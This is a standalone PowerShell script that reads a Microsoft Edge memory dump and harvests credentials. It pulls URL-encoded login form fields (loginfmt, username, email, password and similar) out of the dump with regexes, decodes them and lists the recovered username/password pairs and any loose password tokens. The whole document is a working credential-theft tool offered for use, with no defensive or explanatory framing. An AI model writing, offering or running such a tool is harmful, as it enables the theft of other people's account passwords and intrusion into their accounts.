$ErrorActionPreference='Stop'
Add-Type -AssemblyName System.Web -EA 0
$dump=if($args[0]){$args[0]}else{(Get-ChildItem "$env:TEMP\edge_*.dmp" -EA 0|sort LastWriteTime -Desc|select -First 1).FullName}
if(-not $dump){throw "No edge_*.dmp in `$env:TEMP. Pass a path."}
$size=(Get-Item $dump).Length
"Source: $dump  ($([math]::Round($size/1MB,1)) MB)"
Add-Type -Name F -Namespace X -MemberDefinition @'
public static string T(byte[] b,int n){var c=new char[n];for(int i=0;i<n;i++){var x=b[i];c[i]=(x>32&&x<127)?(char)x:' ';}return new string(c);}
'@ -ErrorAction SilentlyContinue
$rxPair=[regex]::new('(loginfmt|username|email|j_username|user|login)=([^&\s]{2,80})\S{0,500}?(passwd|password|pwd|j_password|pass)=([^&\s]{4,80})','Compiled,IgnoreCase')
$rxPw=[regex]::new('(passwd|password|pwd|j_password)=([^&\s]{4,80})','Compiled,IgnoreCase')
$fs=[IO.File]::OpenRead($dump);$buf=New-Object byte[] 16MB;$tail=''
$pairs=New-Object Collections.Generic.HashSet[string];$pwOnly=New-Object Collections.Generic.HashSet[string]
$sw=[Diagnostics.Stopwatch]::StartNew();$done=0
try{while(($n=$fs.Read($buf,0,$buf.Length))-gt0){
$s=$tail+[X.F]::T($buf,$n)
foreach($m in $rxPair.Matches($s)){
  $u=[Web.HttpUtility]::UrlDecode($m.Groups[2].Value)
  $p=[Web.HttpUtility]::UrlDecode($m.Groups[4].Value)
  [void]$pairs.Add(("{0,-32}  {1}" -f $u,$p))
}
foreach($m in $rxPw.Matches($s)){
  $p=[Web.HttpUtility]::UrlDecode($m.Groups[2].Value)
  [void]$pwOnly.Add($p)
}
$tail=if($s.Length-gt 1024){$s.Substring($s.Length-1024)}else{$s}
$done+=$n;Write-Host -NoNewline "`r$([int]($done/1MB)) / $([int]($size/1MB)) MB  pairs=$($pairs.Count) pw=$($pwOnly.Count)   "
}}finally{$fs.Close()}
$sw.Stop();""
"`n=== USER + PASSWORD pairs ($($pairs.Count)) ==="
"{0,-32}  {1}" -f 'USER','PASSWORD'
'-'*80
$pairs
"`n=== Standalone password tokens ($($pwOnly.Count)) ==="
$pwOnly|select -First 20
"`nElapsed: $([int]$sw.Elapsed.TotalSeconds)s"
